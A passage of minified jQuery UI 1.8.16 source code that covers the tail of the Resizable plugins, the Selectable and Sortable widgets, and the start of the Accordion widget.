b=e(this).data("resizable"),a=b.options,c=b.containerOffset,d=b.containerPosition,f=b.containerElement,g=e(b.helper),h=g.offset(),i=g.outerWidth()-b.sizeDiff.width;g=g.outerHeight()-b.sizeDiff.height;b._helper&&!a.animate&&/relative/.test(f.css("position"))&&e(this).css({left:h.left-d.left-c.left,width:i,height:g});b._helper&&!a.animate&&/static/.test(f.css("position"))&&e(this).css({left:h.left-d.left-c.left,width:i,height:g})}});e.ui.plugin.add("resizable","ghost",{start:function(){var b=e(this).data("resizable"),a=b.options,c=b.size;b.ghost=b.originalElement.clone();b.ghost.css({opacity:0.25,display:"block",position:"relative",height:c.height,width:c.width,margin:0,left:0,top:0}).addClass("ui-resizable-ghost").addClass(typeof a.ghost=="string"?a.ghost:"");b.ghost.appendTo(b.helper)},resize:function(){var b=e(this).data("resizable");b.ghost&&b.ghost.css({position:"relative",height:b.size.height,width:b.size.width})},stop:function(){var b=e(this).data("resizable");b.ghost&&b.helper&&b.helper.get(0).removeChild(b.ghost.get(0))}});e.ui.plugin.add("resizable","grid",{resize:function(){var b=e(this).data("resizable"),a=b.options,c=b.size,d=b.originalSize,f=b.originalPosition,g=b.axis;a.grid=typeof a.grid=="number"?[a.grid,a.grid]:a.grid;var h=Math.round((c.width-d.width)/(a.grid[0]||1))*(a.grid[0]||1);a=Math.round((c.height-d.height)/(a.grid[1]||1))*(a.grid[1]||1);if(/^(se|s|e)$/.test(g)){b.size.width=d.width+h;b.size.height=d.height+a}else if(/^(ne)$/.test(g)){b.size.width=d.width+h;b.size.height=d.height+a;b.position.top=f.top-a}else{if(/^(sw)$/.test(g)){b.size.width=d.width+h;b.size.height=d.height+a}else{b.size.width=d.width+h;b.size.height=d.height+a;b.position.top=f.top-a}b.position.left=f.left-h}}});var m=function(b){return parseInt(b,10)||0},k=function(b){return!isNaN(parseInt(b,10))}})(jQuery);

/*
 * jQuery UI Selectable 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Selectables
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.mouse.js
 *jquery.ui.widget.js
 */
(function(e){e.widget("ui.selectable",e.ui.mouse,{options:{appendTo:"body",autoRefresh:true,distance:0,filter:"*",tolerance:"touch"},_create:function(){var c=this;this.element.addClass("ui-selectable");this.dragged=false;var f;this.refresh=function(){f=e(c.options.filter,c.element[0]);f.each(function(){var d=e(this),b=d.offset();e.data(this,"selectable-item",{element:this,$element:d,left:b.left,top:b.top,right:b.left+d.outerWidth(),bottom:b.top+d.outerHeight(),startselected:false,selected:d.hasClass("ui-selected"),selecting:d.hasClass("ui-selecting"),unselecting:d.hasClass("ui-unselecting")})})};this.refresh();this.selectees=f.addClass("ui-selectee");this._mouseInit();this.helper=e("<div class='ui-selectable-helper'></div>")},destroy:function(){this.selectees.removeClass("ui-selectee").removeData("selectable-item");this.element.removeClass("ui-selectable ui-selectable-disabled").removeData("selectable").unbind(".selectable");this._mouseDestroy();return this},_mouseStart:function(c){var f=this;this.opos=[c.pageX,c.pageY];if(!this.options.disabled){var d=this.options;this.selectees=e(d.filter,this.element[0]);this._trigger("start",c);e(d.appendTo).append(this.helper);this.helper.css({left:c.clientX,top:c.clientY,width:0,height:0});d.auto_refresh&&this.refresh();this.selectees.filter(".ui-selected").each(function(){var b=e.data(this,"selectable-item");b.startselected=true;if(!c.metaKey){b.$element.removeClass("ui-selected");b.selected=false;b.$element.addClass("ui-unselecting");b.unselecting=true;f._trigger("unselecting",c,{unselecting:b.element})}});e(c.target).parents().andSelf().each(function(){var b=e.data(this,"selectable-item");if(b){var g=!c.metaKey||!b.$element.hasClass("ui-selected");b.$element.removeClass(g?"ui-unselecting":"ui-selected").addClass(g?"ui-selecting":"ui-unselecting");b.unselecting=!g;b.selecting=g;(b.selected=g)?f._trigger("selecting",c,{selecting:b.element}):f._trigger("unselecting",c,{unselecting:b.element});return false}})}},_mouseDrag:function(c){var f=this;this.dragged=true;if(!this.options.disabled){var d=this.options,b=this.opos[0],g=this.opos[1],h=c.pageX,i=c.pageY;if(b>h){var j=h;h=b;b=j}if(g>i){j=i;i=g;g=j}this.helper.css({left:b,top:g,width:h-b,height:i-g});this.selectees.each(function(){var a=e.data(this,"selectable-item");if(!(!a||a.element==f.element[0])){var k=false;if(d.tolerance=="touch")k=!(a.left>h||a.right<b||a.top>i||a.bottom<g);else if(d.tolerance=="fit")k=a.left>b&&a.right<h&&a.top>g&&a.bottom<i;if(k){if(a.selected){a.$element.removeClass("ui-selected");a.selected=false}if(a.unselecting){a.$element.removeClass("ui-unselecting");a.unselecting=false}if(!a.selecting){a.$element.addClass("ui-selecting");a.selecting=true;f._trigger("selecting",c,{selecting:a.element})}}else{if(a.selecting)if(c.metaKey&&a.startselected){a.$element.removeClass("ui-selecting");a.selecting=false;a.$element.addClass("ui-selected");a.selected=true}else{a.$element.removeClass("ui-selecting");a.selecting=false;if(a.startselected){a.$element.addClass("ui-unselecting");a.unselecting=true}f._trigger("unselecting",c,{unselecting:a.element})}if(a.selected)if(!c.metaKey&&!a.startselected){a.$element.removeClass("ui-selected");a.selected=false;a.$element.addClass("ui-unselecting");a.unselecting=true;f._trigger("unselecting",c,{unselecting:a.element})}}}});return false}},_mouseStop:function(c){var f=this;this.dragged=false;e(".ui-unselecting",this.element[0]).each(function(){var d=e.data(this,"selectable-item");d.$element.removeClass("ui-unselecting");d.unselecting=false;d.startselected=false;f._trigger("unselected",c,{unselected:d.element})});e(".ui-selecting",this.element[0]).each(function(){var d=e.data(this,"selectable-item");d.$element.removeClass("ui-selecting").addClass("ui-selected");d.selecting=false;d.selected=true;d.startselected=true;f._trigger("selected",c,{selected:d.element})});this._trigger("stop",c);this.helper.remove();return false}});e.extend(e.ui.selectable,{version:"1.8.16"})})(jQuery);

/*
 * jQuery UI Sortable 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Sortables
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.mouse.js
 *jquery.ui.widget.js
 */
(function(d){d.widget("ui.sortable",d.ui.mouse,{widgetEventPrefix:"sort",options:{appendTo:"parent",axis:false,connectWith:false,containment:false,cursor:"auto",cursorAt:false,dropOnEmpty:true,forcePlaceholderSize:false,forceHelperSize:false,grid:false,handle:false,helper:"original",items:"> *",opacity:false,placeholder:false,revert:false,scroll:true,scrollSensitivity:20,scrollSpeed:20,scope:"default",tolerance:"intersect",zIndex:1E3},_create:function(){var a=this.options;this.containerCache={};this.element.addClass("ui-sortable");this.refresh();this.floating=this.items.length?a.axis==="x"||/left|right/.test(this.items[0].item.css("float"))||/inline|table-cell/.test(this.items[0].item.css("display")):false;this.offset=this.element.offset();this._mouseInit()},destroy:function(){this.element.removeClass("ui-sortable ui-sortable-disabled").removeData("sortable").unbind(".sortable");this._mouseDestroy();for(var a=this.items.length-1;a>=0;a--)this.items[a].item.removeData("sortable-item");return this},_setOption:function(a,b){if(a==="disabled"){this.options[a]=b;this.widget()[b?"addClass":"removeClass"]("ui-sortable-disabled")}else d.Widget.prototype._setOption.apply(this,arguments)},_mouseCapture:function(a,b){if(this.reverting)return false;if(this.options.disabled||this.options.type=="static")return false;this._refreshItems(a);var c=null,e=this;d(a.target).parents().each(function(){if(d.data(this,"sortable-item")==e){c=d(this);return false}});if(d.data(a.target,"sortable-item")==e)c=d(a.target);if(!c)return false;if(this.options.handle&&!b){var f=false;d(this.options.handle,c).find("*").andSelf().each(function(){if(this==a.target)f=true});if(!f)return false}this.currentItem=c;this._removeCurrentsFromItems();return true},_mouseStart:function(a,b,c){b=this.options;var e=this;this.currentContainer=this;this.refreshPositions();this.helper=this._createHelper(a);this._cacheHelperProportions();this._cacheMargins();this.scrollParent=this.helper.scrollParent();this.offset=this.currentItem.offset();this.offset={top:this.offset.top-this.margins.top,left:this.offset.left-this.margins.left};this.helper.css("position","absolute");this.cssPosition=this.helper.css("position");d.extend(this.offset,{click:{left:a.pageX-this.offset.left,top:a.pageY-this.offset.top},parent:this._getParentOffset(),relative:this._getRelativeOffset()});this.originalPosition=this._generatePosition(a);this.originalPageX=a.pageX;this.originalPageY=a.pageY;b.cursorAt&&this._adjustOffsetFromHelper(b.cursorAt);this.domPosition={prev:this.currentItem.prev()[0],parent:this.currentItem.parent()[0]};this.helper[0]!=this.currentItem[0]&&this.currentItem.hide();this._createPlaceholder();b.containment&&this._setContainment();if(b.cursor){if(d("body").css("cursor"))this._storedCursor=d("body").css("cursor");d("body").css("cursor",b.cursor)}if(b.opacity){if(this.helper.css("opacity"))this._storedOpacity=this.helper.css("opacity");this.helper.css("opacity",b.opacity)}if(b.zIndex){if(this.helper.css("zIndex"))this._storedZIndex=this.helper.css("zIndex");this.helper.css("zIndex",b.zIndex)}if(this.scrollParent[0]!=document&&this.scrollParent[0].tagName!="HTML")this.overflowOffset=this.scrollParent.offset();this._trigger("start",a,this._uiHash());this._preserveHelperProportions||this._cacheHelperProportions();if(!c)for(c=this.containers.length-1;c>=0;c--)this.containers[c]._trigger("activate",a,e._uiHash(this));if(d.ui.ddmanager)d.ui.ddmanager.current=this;d.ui.ddmanager&&!b.dropBehaviour&&d.ui.ddmanager.prepareOffsets(this,a);this.dragging=true;this.helper.addClass("ui-sortable-helper");this._mouseDrag(a);return true},_mouseDrag:function(a){this.position=this._generatePosition(a);this.positionAbs=this._convertPositionTo("absolute");if(!this.lastPositionAbs)this.lastPositionAbs=this.positionAbs;if(this.options.scroll){var b=this.options,c=false;if(this.scrollParent[0]!=document&&this.scrollParent[0].tagName!="HTML"){if(this.overflowOffset.top+this.scrollParent[0].offsetHeight-a.pageY<b.scrollSensitivity)this.scrollParent[0].scrollTop=c=this.scrollParent[0].scrollTop+b.scrollSpeed;else if(a.pageY-this.overflowOffset.top<b.scrollSensitivity)this.scrollParent[0].scrollTop=c=this.scrollParent[0].scrollTop-b.scrollSpeed;if(this.overflowOffset.left+this.scrollParent[0].offsetWidth-a.pageX<b.scrollSensitivity)this.scrollParent[0].scrollLeft=c=this.scrollParent[0].scrollLeft+b.scrollSpeed;else if(a.pageX-this.overflowOffset.left<b.scrollSensitivity)this.scrollParent[0].scrollLeft=c=this.scrollParent[0].scrollLeft-b.scrollSpeed}else{if(a.pageY-d(document).scrollTop()<b.scrollSensitivity)c=d(document).scrollTop(d(document).scrollTop()-b.scrollSpeed);else if(d(window).height()-(a.pageY-d(document).scrollTop())<b.scrollSensitivity)c=d(document).scrollTop(d(document).scrollTop()+b.scrollSpeed);if(a.pageX-d(document).scrollLeft()<b.scrollSensitivity)c=d(document).scrollLeft(d(document).scrollLeft()-b.scrollSpeed);else if(d(window).width()-(a.pageX-d(document).scrollLeft())<b.scrollSensitivity)c=d(document).scrollLeft(d(document).scrollLeft()+b.scrollSpeed)}c!==false&&d.ui.ddmanager&&!b.dropBehaviour&&d.ui.ddmanager.prepareOffsets(this,a)}this.positionAbs=this._convertPositionTo("absolute");if(!this.options.axis||this.options.axis!="y")this.helper[0].style.left=this.position.left+"px";if(!this.options.axis||this.options.axis!="x")this.helper[0].style.top=this.position.top+"px";for(b=this.items.length-1;b>=0;b--){c=this.items[b];var e=c.item[0],f=this._intersectsWithPointer(c);if(f)if(e!=this.currentItem[0]&&this.placeholder[f==1?"next":"prev"]()[0]!=e&&!d.ui.contains(this.placeholder[0],e)&&(this.options.type=="semi-dynamic"?!d.ui.contains(this.element[0],e):true)){this.direction=f==1?"down":"up";if(this.options.tolerance=="pointer"||this._intersectsWithSides(c))this._rearrange(a,c);else break;this._trigger("change",a,this._uiHash());break}}this._contactContainers(a);d.ui.ddmanager&&d.ui.ddmanager.drag(this,a);this._trigger("sort",a,this._uiHash());this.lastPositionAbs=this.positionAbs;return false},_mouseStop:function(a,b){if(a){d.ui.ddmanager&&!this.options.dropBehaviour&&d.ui.ddmanager.drop(this,a);if(this.options.revert){var c=this;b=c.placeholder.offset();c.reverting=true;d(this.helper).animate({left:b.left-this.offset.parent.left-c.margins.left+(this.offsetParent[0]==document.body?0:this.offsetParent[0].scrollLeft),top:b.top-this.offset.parent.top-c.margins.top+(this.offsetParent[0]==document.body?0:this.offsetParent[0].scrollTop)},parseInt(this.options.revert,10)||500,function(){c._clear(a)})}else this._clear(a,b);return false}},cancel:function(){var a=this;if(this.dragging){this._mouseUp({target:null});this.options.helper=="original"?this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper"):this.currentItem.show();for(var b=this.containers.length-1;b>=0;b--){this.containers[b]._trigger("deactivate",null,a._uiHash(this));if(this.containers[b].containerCache.over){this.containers[b]._trigger("out",null,a._uiHash(this));this.containers[b].containerCache.over=0}}}if(this.placeholder){this.placeholder[0].parentNode&&this.placeholder[0].parentNode.removeChild(this.placeholder[0]);this.options.helper!="original"&&this.helper&&this.helper[0].parentNode&&this.helper.remove();d.extend(this,{helper:null,dragging:false,reverting:false,_noFinalSort:null});this.domPosition.prev?d(this.domPosition.prev).after(this.currentItem):d(this.domPosition.parent).prepend(this.currentItem)}return this},serialize:function(a){var b=this._getItemsAsjQuery(a&&a.connected),c=[];a=a||{};d(b).each(function(){var e=(d(a.item||this).attr(a.attribute||"id")||"").match(a.expression||/(.+)[-=_](.+)/);if(e)c.push((a.key||e[1]+"[]")+"="+(a.key&&a.expression?e[1]:e[2]))});!c.length&&a.key&&c.push(a.key+"=");return c.join("&")},toArray:function(a){var b=this._getItemsAsjQuery(a&&a.connected),c=[];a=a||{};b.each(function(){c.push(d(a.item||this).attr(a.attribute||"id")||"")});return c},_intersectsWith:function(a){var b=this.positionAbs.left,c=b+this.helperProportions.width,e=this.positionAbs.top,f=e+this.helperProportions.height,g=a.left,h=g+a.width,i=a.top,k=i+a.height,j=this.offset.click.top,l=this.offset.click.left;j=e+j>i&&e+j<k&&b+l>g&&b+l<h;return this.options.tolerance=="pointer"||this.options.forcePointerForContainers||this.options.tolerance!="pointer"&&this.helperProportions[this.floating?"width":"height"]>a[this.floating?"width":"height"]?j:g<b+this.helperProportions.width/2&&c-this.helperProportions.width/2<h&&i<e+this.helperProportions.height/2&&f-this.helperProportions.height/2<k},_intersectsWithPointer:function(a){var b=d.ui.isOverAxis(this.positionAbs.top+this.offset.click.top,a.top,a.height);a=d.ui.isOverAxis(this.positionAbs.left+this.offset.click.left,a.left,a.width);b=b&&a;a=this._getDragVerticalDirection();var c=this._getDragHorizontalDirection();if(!b)return false;return this.floating?c&&c=="right"||a=="down"?2:1:a&&(a=="down"?2:1)},_intersectsWithSides:function(a){var b=d.ui.isOverAxis(this.positionAbs.top+this.offset.click.top,a.top+a.height/2,a.height);a=d.ui.isOverAxis(this.positionAbs.left+this.offset.click.left,a.left+a.width/2,a.width);var c=this._getDragVerticalDirection(),e=this._getDragHorizontalDirection();return this.floating&&e?e=="right"&&a||e=="left"&&!a:c&&(c=="down"&&b||c=="up"&&!b)},_getDragVerticalDirection:function(){var a=this.positionAbs.top-this.lastPositionAbs.top;return a!=0&&(a>0?"down":"up")},_getDragHorizontalDirection:function(){var a=this.positionAbs.left-this.lastPositionAbs.left;return a!=0&&(a>0?"right":"left")},refresh:function(a){this._refreshItems(a);this.refreshPositions();return this},_connectWith:function(){var a=this.options;return a.connectWith.constructor==String?[a.connectWith]:a.connectWith},_getItemsAsjQuery:function(a){var b=[],c=[],e=this._connectWith();if(e&&a)for(a=e.length-1;a>=0;a--)for(var f=d(e[a]),g=f.length-1;g>=0;g--){var h=d.data(f[g],"sortable");if(h&&h!=this&&!h.options.disabled)c.push([d.isFunction(h.options.items)?h.options.items.call(h.element):d(h.options.items,h.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),h])}c.push([d.isFunction(this.options.items)?this.options.items.call(this.element,null,{options:this.options,item:this.currentItem}):d(this.options.items,this.element).not(".ui-sortable-helper").not(".ui-sortable-placeholder"),this]);for(a=c.length-1;a>=0;a--)c[a][0].each(function(){b.push(this)});return d(b)},_removeCurrentsFromItems:function(){for(var a=this.currentItem.find(":data(sortable-item)"),b=0;b<this.items.length;b++)for(var c=0;c<a.length;c++)a[c]==this.items[b].item[0]&&this.items.splice(b,1)},_refreshItems:function(a){this.items=[];this.containers=[this];var b=this.items,c=[[d.isFunction(this.options.items)?this.options.items.call(this.element[0],a,{item:this.currentItem}):d(this.options.items,this.element),this]],e=this._connectWith();if(e)for(var f=e.length-1;f>=0;f--)for(var g=d(e[f]),h=g.length-1;h>=0;h--){var i=d.data(g[h],"sortable");if(i&&i!=this&&!i.options.disabled){c.push([d.isFunction(i.options.items)?i.options.items.call(i.element[0],a,{item:this.currentItem}):d(i.options.items,i.element),i]);this.containers.push(i)}}for(f=c.length-1;f>=0;f--){a=c[f][1];e=c[f][0];h=0;for(g=e.length;h<g;h++){i=d(e[h]);i.data("sortable-item",a);b.push({item:i,instance:a,width:0,height:0,left:0,top:0})}}},refreshPositions:function(a){if(this.offsetParent&&this.helper)this.offset.parent=this._getParentOffset();for(var b=this.items.length-1;b>=0;b--){var c=this.items[b];if(!(c.instance!=this.currentContainer&&this.currentContainer&&c.item[0]!=this.currentItem[0])){var e=this.options.toleranceElement?d(this.options.toleranceElement,c.item):c.item;if(!a){c.width=e.outerWidth();c.height=e.outerHeight()}e=e.offset();c.left=e.left;c.top=e.top}}if(this.options.custom&&this.options.custom.refreshContainers)this.options.custom.refreshContainers.call(this);else for(b=this.containers.length-1;b>=0;b--){e=this.containers[b].element.offset();this.containers[b].containerCache.left=e.left;this.containers[b].containerCache.top=e.top;this.containers[b].containerCache.width=this.containers[b].element.outerWidth();this.containers[b].containerCache.height=this.containers[b].element.outerHeight()}return this},_createPlaceholder:function(a){var b=a||this,c=b.options;if(!c.placeholder||c.placeholder.constructor==String){var e=c.placeholder;c.placeholder={element:function(){var f=d(document.createElement(b.currentItem[0].nodeName)).addClass(e||b.currentItem[0].className+" ui-sortable-placeholder").removeClass("ui-sortable-helper")[0];if(!e)f.style.visibility="hidden";return f},update:function(f,g){if(!(e&&!c.forcePlaceholderSize)){g.height()||g.height(b.currentItem.innerHeight()-parseInt(b.currentItem.css("paddingTop")||0,10)-parseInt(b.currentItem.css("paddingBottom")||0,10));g.width()||g.width(b.currentItem.innerWidth()-parseInt(b.currentItem.css("paddingLeft")||0,10)-parseInt(b.currentItem.css("paddingRight")||0,10))}}}}b.placeholder=d(c.placeholder.element.call(b.element,b.currentItem));b.currentItem.after(b.placeholder);c.placeholder.update(b,b.placeholder)},_contactContainers:function(a){for(var b=null,c=null,e=this.containers.length-1;e>=0;e--)if(!d.ui.contains(this.currentItem[0],this.containers[e].element[0]))if(this._intersectsWith(this.containers[e].containerCache)){if(!(b&&d.ui.contains(this.containers[e].element[0],b.element[0]))){b=this.containers[e];c=e}}else if(this.containers[e].containerCache.over){this.containers[e]._trigger("out",a,this._uiHash(this));this.containers[e].containerCache.over=0}if(b)if(this.containers.length===1){this.containers[c]._trigger("over",a,this._uiHash(this));this.containers[c].containerCache.over=1}else if(this.currentContainer!=this.containers[c]){b=1E4;e=null;for(var f=this.positionAbs[this.containers[c].floating?"left":"top"],g=this.items.length-1;g>=0;g--)if(d.ui.contains(this.containers[c].element[0],this.items[g].item[0])){var h=this.items[g][this.containers[c].floating?"left":"top"];if(Math.abs(h-f)<b){b=Math.abs(h-f);e=this.items[g]}}if(e||this.options.dropOnEmpty){this.currentContainer=this.containers[c];e?this._rearrange(a,e,null,true):this._rearrange(a,null,this.containers[c].element,true);this._trigger("change",a,this._uiHash());this.containers[c]._trigger("change",a,this._uiHash(this));this.options.placeholder.update(this.currentContainer,this.placeholder);this.containers[c]._trigger("over",a,this._uiHash(this));this.containers[c].containerCache.over=1}}},_createHelper:function(a){var b=this.options;a=d.isFunction(b.helper)?d(b.helper.apply(this.element[0],[a,this.currentItem])):b.helper=="clone"?this.currentItem.clone():this.currentItem;a.parents("body").length||d(b.appendTo!="parent"?b.appendTo:this.currentItem[0].parentNode)[0].appendChild(a[0]);if(a[0]==this.currentItem[0])this._storedCSS={width:this.currentItem[0].style.width,height:this.currentItem[0].style.height,position:this.currentItem.css("position"),top:this.currentItem.css("top"),left:this.currentItem.css("left")};if(a[0].style.width==""||b.forceHelperSize)a.width(this.currentItem.width());if(a[0].style.height==""||b.forceHelperSize)a.height(this.currentItem.height());return a},_adjustOffsetFromHelper:function(a){if(typeof a=="string")a=a.split(" ");if(d.isArray(a))a={left:+a[0],top:+a[1]||0};if("left"in a)this.offset.click.left=a.left+this.margins.left;if("right"in a)this.offset.click.left=this.helperProportions.width-a.right+this.margins.left;if("top"in a)this.offset.click.top=a.top+this.margins.top;if("bottom"in a)this.offset.click.top=this.helperProportions.height-a.bottom+this.margins.top},_getParentOffset:function(){this.offsetParent=this.helper.offsetParent();var a=this.offsetParent.offset();if(this.cssPosition=="absolute"&&this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0])){a.left+=this.scrollParent.scrollLeft();a.top+=this.scrollParent.scrollTop()}if(this.offsetParent[0]==document.body||this.offsetParent[0].tagName&&this.offsetParent[0].tagName.toLowerCase()=="html"&&d.browser.msie)a={top:0,left:0};return{top:a.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:a.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if(this.cssPosition=="relative"){var a=this.currentItem.position();return{top:a.top-(parseInt(this.helper.css("top"),10)||0)+this.scrollParent.scrollTop(),left:a.left-(parseInt(this.helper.css("left"),10)||0)+this.scrollParent.scrollLeft()}}else return{top:0,left:0}},_cacheMargins:function(){this.margins={left:parseInt(this.currentItem.css("marginLeft"),10)||0,top:parseInt(this.currentItem.css("marginTop"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var a=this.options;if(a.containment=="parent")a.containment=this.helper[0].parentNode;if(a.containment=="document"||a.containment=="window")this.containment=[0-this.offset.relative.left-this.offset.parent.left,0-this.offset.relative.top-this.offset.parent.top,d(a.containment=="document"?document:window).width()-this.helperProportions.width-this.margins.left,(d(a.containment=="document"?document:window).height()||document.body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top];if(!/^(document|window|parent)$/.test(a.containment)){var b=d(a.containment)[0];a=d(a.containment).offset();var c=d(b).css("overflow")!="hidden";this.containment=[a.left+(parseInt(d(b).css("borderLeftWidth"),10)||0)+(parseInt(d(b).css("paddingLeft"),10)||0)-this.margins.left,a.top+(parseInt(d(b).css("borderTopWidth"),10)||0)+(parseInt(d(b).css("paddingTop"),10)||0)-this.margins.top,a.left+(c?Math.max(b.scrollWidth,b.offsetWidth):b.offsetWidth)-(parseInt(d(b).css("borderLeftWidth"),10)||0)-(parseInt(d(b).css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left,a.top+(c?Math.max(b.scrollHeight,b.offsetHeight):b.offsetHeight)-(parseInt(d(b).css("borderTopWidth"),10)||0)-(parseInt(d(b).css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top]}},_convertPositionTo:function(a,b){if(!b)b=this.position;a=a=="absolute"?1:-1;var c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0]))?this.offsetParent:this.scrollParent,e=/(html|body)/i.test(c[0].tagName);return{top:b.top+this.offset.relative.top*a+this.offset.parent.top*a-(d.browser.safari&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollTop():e?0:c.scrollTop())*a),left:b.left+this.offset.relative.left*a+this.offset.parent.left*a-(d.browser.safari&&this.cssPosition=="fixed"?0:(this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():e?0:c.scrollLeft())*a)}},_generatePosition:function(a){var b=this.options,c=this.cssPosition=="absolute"&&!(this.scrollParent[0]!=document&&d.ui.contains(this.scrollParent[0],this.offsetParent[0]))?this.offsetParent:this.scrollParent,e=/(html|body)/i.test(c[0].tagName);if(this.cssPosition=="relative"&&!(this.scrollParent[0]!=document&&this.scrollParent[0]!=this.offsetParent[0]))this.offset.relative=this._getRelativeOffset();var f=a.pageX,g=a.pageY;if(this.originalPosition){if(this.containment){if(a.pageX-this.offset.click.left<this.containment[0])f=this.containment[0]+this.offset.click.left;if(a.pageY-this.offset.click.top<this.containment[1])g=this.containment[1]+this.offset.click.top;if(a.pageX-this.offset.click.left>this.containment[2])f=this.containment[2]+this.offset.click.left;if(a.pageY-this.offset.click.top>this.containment[3])g=this.containment[3]+this.offset.click.top}if(b.grid){g=this.originalPageY+Math.round((g-this.originalPageY)/b.grid[1])*b.grid[1];g=this.containment?!(g-this.offset.click.top<this.containment[1]||g-this.offset.click.top>this.containment[3])?g:!(g-this.offset.click.top<this.containment[1])?g-b.grid[1]:g+b.grid[1]:g;f=this.originalPageX+Math.round((f-this.originalPageX)/b.grid[0])*b.grid[0];f=this.containment?!(f-this.offset.click.left<this.containment[0]||f-this.offset.click.left>this.containment[2])?f:!(f-this.offset.click.left<this.containment[0])?f-b.grid[0]:f+b.grid[0]:f}}return{top:g-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+(d.browser.safari&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollTop():e?0:c.scrollTop()),left:f-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+(d.browser.safari&&this.cssPosition=="fixed"?0:this.cssPosition=="fixed"?-this.scrollParent.scrollLeft():e?0:c.scrollLeft())}},_rearrange:function(a,b,c,e){c?c[0].appendChild(this.placeholder[0]):b.item[0].parentNode.insertBefore(this.placeholder[0],this.direction=="down"?b.item[0]:b.item[0].nextSibling);this.counter=this.counter?++this.counter:1;var f=this,g=this.counter;window.setTimeout(function(){g==f.counter&&f.refreshPositions(!e)},0)},_clear:function(a,b){this.reverting=false;var c=[];!this._noFinalSort&&this.currentItem.parent().length&&this.placeholder.before(this.currentItem);this._noFinalSort=null;if(this.helper[0]==this.currentItem[0]){for(var e in this._storedCSS)if(this._storedCSS[e]=="auto"||this._storedCSS[e]=="static")this._storedCSS[e]="";this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper")}else this.currentItem.show();this.fromOutside&&!b&&c.push(function(f){this._trigger("receive",f,this._uiHash(this.fromOutside))});if((this.fromOutside||this.domPosition.prev!=this.currentItem.prev().not(".ui-sortable-helper")[0]||this.domPosition.parent!=this.currentItem.parent()[0])&&!b)c.push(function(f){this._trigger("update",f,this._uiHash())});if(!d.ui.contains(this.element[0],this.currentItem[0])){b||c.push(function(f){this._trigger("remove",f,this._uiHash())});for(e=this.containers.length-1;e>=0;e--)if(d.ui.contains(this.containers[e].element[0],this.currentItem[0])&&!b){c.push(function(f){return function(g){f._trigger("receive",g,this._uiHash(this))}}.call(this,this.containers[e]));c.push(function(f){return function(g){f._trigger("update",g,this._uiHash(this))}}.call(this,this.containers[e]))}}for(e=this.containers.length-1;e>=0;e--){b||c.push(function(f){return function(g){f._trigger("deactivate",g,this._uiHash(this))}}.call(this,this.containers[e]));if(this.containers[e].containerCache.over){c.push(function(f){return function(g){f._trigger("out",g,this._uiHash(this))}}.call(this,this.containers[e]));this.containers[e].containerCache.over=0}}this._storedCursor&&d("body").css("cursor",this._storedCursor);this._storedOpacity&&this.helper.css("opacity",this._storedOpacity);if(this._storedZIndex)this.helper.css("zIndex",this._storedZIndex=="auto"?"":this._storedZIndex);this.dragging=false;if(this.cancelHelperRemoval){if(!b){this._trigger("beforeStop",a,this._uiHash());for(e=0;e<c.length;e++)c[e].call(this,a);this._trigger("stop",a,this._uiHash())}return false}b||this._trigger("beforeStop",a,this._uiHash());this.placeholder[0].parentNode.removeChild(this.placeholder[0]);this.helper[0]!=this.currentItem[0]&&this.helper.remove();this.helper=null;if(!b){for(e=0;e<c.length;e++)c[e].call(this,a);this._trigger("stop",a,this._uiHash())}this.fromOutside=false;return true},_trigger:function(){d.Widget.prototype._trigger.apply(this,arguments)===false&&this.cancel()},_uiHash:function(a){var b=a||this;return{helper:b.helper,placeholder:b.placeholder||d([]),position:b.position,originalPosition:b.originalPosition,offset:b.positionAbs,item:b.currentItem,sender:a?a.element:null}}});d.extend(d.ui.sortable,{version:"1.8.16"})})(jQuery);



/*
 * jQuery UI Accordion 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Accordion
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.widget.js
 */
(function(c){c.widget("ui.accordion",{options:{active:0,animated:"slide",autoHeight:true,clearStyle:false,collapsible:false,event:"click",fillSpace:false,header:"> li > :first-child,> :not(li):even",icons:{header:"ui-icon-triangle-1-e",headerSelected:"ui-icon-triangle-1-s"},navigation:false,navigationFilter:function(){return this.href.toLowerCase()===location.href.toLowerCase()}},_create:function(){var a=this,b=a.options;a.running=0;a.element.addClass("ui-accordion ui-widget ui-helper-reset").children("li").addClass("ui-accordion-li-fix");a.headers=a.element.find(b.header).addClass("ui-accordion-header ui-helper-reset ui-state-default ui-corner-all").bind("mouseenter.accordion",function(){b.disabled||c(this).addClass("ui-state-hover")}).bind("mouseleave.accordion",function(){b.disabled||c(this).removeClass("ui-state-hover")}).bind("focus.accordion",function(){b.disabled||c(this).addClass("ui-state-focus")}).bind("blur.accordion",function(){b.disabled||c(this).removeClass("ui-state-focus")});a.headers.next().addClass("ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom");if(b.navigation){var 